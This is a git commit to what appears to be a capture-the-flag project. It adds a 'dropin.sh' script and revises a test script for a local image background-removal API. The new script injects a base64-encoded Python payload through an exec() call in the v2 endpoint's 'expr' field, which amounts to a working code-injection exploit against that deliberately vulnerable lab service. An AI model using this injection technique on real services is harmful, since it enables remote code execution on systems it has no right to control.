ce62388bd755c28a21fb77380811af8ea246d69c
Ramon Marquez <ramon.marquez@graylog.com>
2024-07-18 16:44:29 -0400

    fix(ctf): too many quotes to escape from

---
+++ ctf/scripts/dropin.sh
@@ -0,0 +1,19 @@
+#!/bin/sh
+
+mkdir images
+
+export PAYLOAD_FILE=$(pwd)/payload.py
+
+echo "Fetching sample image..."
+curl -L -o images/input.jpg "https://github.com/danielgatis/rembg/blob/main/examples/animal-1.jpg?raw=true"
+IMAGE_FILE=${1:-"images/input.jpg"}
+
+base64 $IMAGE_FILE | tr -d \\n | jq -Rn '.image = inputs' > input.json
+
+jq --arg expression "exec('import base64;exec(base64.b64decode(\\\"$(base64 $PAYLOAD_FILE | tr -d \\n)\\\"))')" '.expr = $expression' input.json > v2.json && mv v2.json input.json
+
+echo "\nTesting /v2/remove endpoint..."
+curl -H "Content-type:application/json" -d @input.json http://localhost:8080/v2/remove | jq -r '.result|ltrimstr("data:image/png;base64,")' | base64 -d > images/output-exploit.png
+
+rm input.json
+echo "All done!"
--- ctf/scripts/tests.sh
+++ ctf/scripts/tests.sh
@@ -1,20 +1,20 @@
 #!/bin/sh
 
-IMAGE_FILE=$1
+mkdir images
 
-p1='{"image":"'
-p2=$(base64 -i $IMAGE_FILE)
-p3='"}'
+echo "Fetching sample image..."
+curl -L -o images/input.jpg "https://github.com/danielgatis/rembg/blob/main/examples/animal-1.jpg?raw=true"
+IMAGE_FILE=${1:-"images/input.jpg"}
 
-echo "Testing /v1/remove endpoint..."
-curl -H "Content-type:application/json" -d $p1$p2$p3 http://localhost:8080/v1/remove | jq -r '.result|ltrimstr("data:image/png;base64,")' | base64 -d > out-v1.png
+base64 $IMAGE_FILE | tr -d \\n | jq -Rn '.image = inputs' > input.json
 
+echo "\nTesting /v1/remove endpoint..."
+curl -H "Content-type:application/json" -d @input.json http://localhost:8080/v1/remove | jq -r '.result|ltrimstr("data:image/png;base64,")' | base64 -d > images/output-v1.png
 
-p1='{"expr":"'
-p2="convert(image,'"'L'"')"
-p3='","image":"'
-p4=$(base64 -i $IMAGE_FILE)
-p5='"}'
+jq '.expr = "convert(image,'"'L'"')"' input.json > v2.json && mv v2.json input.json
 
-echo "Testing /v2/remove endpoint..."
-curl -H "Content-type:application/json" -d $p1$p2$p3$p4$p5 http://localhost:8080/v2/remove | jq -r '.result|ltrimstr("data:image/png;base64,")' | base64 -d > out-v2.png
+echo "\nTesting /v2/remove endpoint..."
+curl -H "Content-type:application/json" -d @input.json http://localhost:8080/v2/remove | jq -r '.result|ltrimstr("data:image/png;base64,")' | base64 -d > images/output-v2.png
+
+echo "\nAll done! Please, go to port 8081 to check out your images (press cmd/ctrl + c when you are ready to exit this script)"
+rm input.json && cd images && python3 -m http.server 8081
